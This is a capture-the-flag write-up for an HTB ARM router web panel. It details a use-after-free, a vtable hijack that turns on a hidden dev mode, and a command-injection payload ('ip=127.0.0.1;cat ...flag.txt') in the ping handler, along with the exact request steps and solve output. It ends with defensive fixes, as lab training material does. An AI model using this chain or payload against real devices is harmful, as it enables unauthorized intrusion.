---
title: pwn/router-web
platform: HTB
event: try-out
category: pwn
tags: [use-after-free, vtable-hijack, command-injection, arm, crow, qemu]
status: solved
difficulty: 5
---

# pwn/router-web

**Flag:** `HTB{u4f_REDACTED}`

**Difficulty:** 🌶️🌶️🌶️🌶️🌶️ (5/5)

**Solve script:** `artifacts/solve.py`, run with `python3 solve.py <target_ip> <target_port>`.

## Summary

The target is a 32-bit ARM router admin panel built on Crow, with HTTP basic auth (`admin` / `router123`, found in rodata). The flag is in `/opt/router-web-panel/flag.txt`, readable only by the `rweb` user that runs the panel.

The ping page runs `"ping -c 1 " + ip` through `popen`, so it is command injection. It is gated by `dev_mode_enabled`, and the only function that sets it, `enable_dev_mode`, is never called in the binary. The bug path is a use-after-free in the config code. The freed config node is reclaimed by a `Desktop` object. A config write then overwrites the object's vtable pointer. The device update path calls `vtable[0]` on that object, which lands in `enable_dev_mode`.

## Attack chain

- Binary: `router-web-panel.bin`, ARM32, Crow (`Server: Crow/master`), `BasicAuthMiddleware`. Not PIE, with `.data` at `0x85000`.
- Sink: `ping_handler` (`0x66c68`) builds `"ping -c 1 " + ip` and calls `execCommand` (`popen`).
- Gate: `ping_handler` and `admin_handler` return "Dev Mode Not Enabled" while the byte at `0x85654` (`dev_mode_enabled`) is 0. No code references `enable_dev_mode` (`0x1f958`) or `disable_dev_mode` (`0x1fca4`).
- Use-after-free: `save_handler` points `current_config` (`0x85634`) at the node owned by the `configs` map. `/configs/delete/<name>` frees the node but does not clear `current_config`.
- Reclaim: `Desktop` and `Config` are both 168 bytes, so a `Desktop` created after the delete takes the freed chunk.
- Pointer: `Config+0` is `timestamp`. `/configs/update` writes it through the dangling `current_config`, which overwrites the `Desktop` vptr with `0x85008`.
- Fake vtable: `*0x85008 == 0x0001f958`, the address of `enable_dev_mode`. The word is already in `.data`, so no leak is needed.
- Trigger: `devices_update` (`/devices/update`) calls `vtable[0]` on device `id` when the request has a `name` key. That runs `enable_dev_mode` with the device as its sret buffer. The function sets `dev_mode_enabled = 1`.
- Injection: `POST /admin/ping` with `ip=127.0.0.1;cat /opt/router-web-panel/flag.txt` returns the flag in the `<pre>` output.

## Steps

1. Save a config. The response is 307 (redirect to `/configs/list`), and the config is now `current_config`.
   ```
   GET /configs/save?name=<name>
   ```
2. Delete the same config. The node is freed and `current_config` still points at it.
   ```
   GET /configs/delete/<name>
   ```
3. Add a `Desktop` device with no IP. Its object reuses the freed chunk.
   ```
   POST /devices/add   name=Pwn&ip=&mac=00:11:22:33:44:55&type=Desktop&location=x
   ```
4. Update the config as JSON. `timestamp` is written to offset 0 of the reused object, which replaces the vptr with `0x85008`.
   ```
   POST /configs/update   {"dns1":"8.8.8.8","dns2":"8.8.4.4","firewall":"Middle","port_forwards":[],"timestamp":544776}
   ```
5. Send a device update with a `name` key. `devices_update` calls `*(vptr)` on the device, which is `enable_dev_mode`.
   ```
   POST /devices/update   id=0&name=Pwned
   ```
6. Ping with the injected command. The flag is in the output.
   ```
   POST /admin/ping   ip=127.0.0.1;cat /opt/router-web-panel/flag.txt
   ```

Run the script against a live instance:

```
$ python3 solve.py <target_ip> <target_port>
[*] save config: 307
[*] delete config: 200
[*] add desktop: 303
[*] overwrite vptr: 200
[*] trigger enable_dev_mode: 303

[+] Flag:
HTB{u4f_REDACTED}
```

## Problems hit

- The first request sequence was broken. Following the 307 from `/configs/save` made the client request `/configs/list`, and the save did not take effect. Without a real save, the delete freed the wrong state, and the panel crashed on the next `/configs/current`. Not following redirects fixed it.
- The config name `uaf-<hex>` with a hyphen returned 400 from `/configs/save`. Alphanumeric names work.
- After the chain runs, the device stays in the vector with a fake vptr. Any page that calls a virtual method on it (`/devices`, the next ping) can crash the process. The process restarts after roughly 10 to 40 seconds with a fresh state, so a run has to wait for the restart before it starts.
- One run failed with "dev mode is still off" right after a crash and restart. Rerunning the same chain on a fresh process worked. I did not confirm the exact cause of that first failure.
- Locally I used QEMU with the monitor socket and `log exec` to confirm the call path. There is no ARM debugger on the host, so the trace was the only way to see where the process died.

## Defense

- Do not derive a second object's behavior from a freed pointer. Clear `current_config` when its config is deleted, or hold a `shared_ptr` so the node cannot be freed while it is in use.
- Do not call virtual methods on objects whose type is controlled by an attacker-reachable write. Use an explicit type tag, or keep objects behind an owner that does not reuse freed memory for another type.
- Do not expose a shell command built from user input. `ping` should run with `execve` and an argument array, and the input should be validated as an IP address first (`parse_ip_addr` already does this for device IPs).
- Remove dead gates that depend on a flag nothing sets, or make the flag's state visible in the same code path that uses it.

## Lessons

- A function that nothing calls can still be reached through memory. Look for its address in data, not only in direct calls. Here, `0x85008` in `.data` held the `enable_dev_mode` address, which made the vtable hijack possible with no leak.
- In a dangling-pointer bug, the reclaiming object decides what the stale write does. Matching the chunk size (168 bytes for both `Config` and `Desktop`) was the key step.
- Test against a fresh process after each attempt. A crashed panel leaves state behind, and a restart can race with the next request.
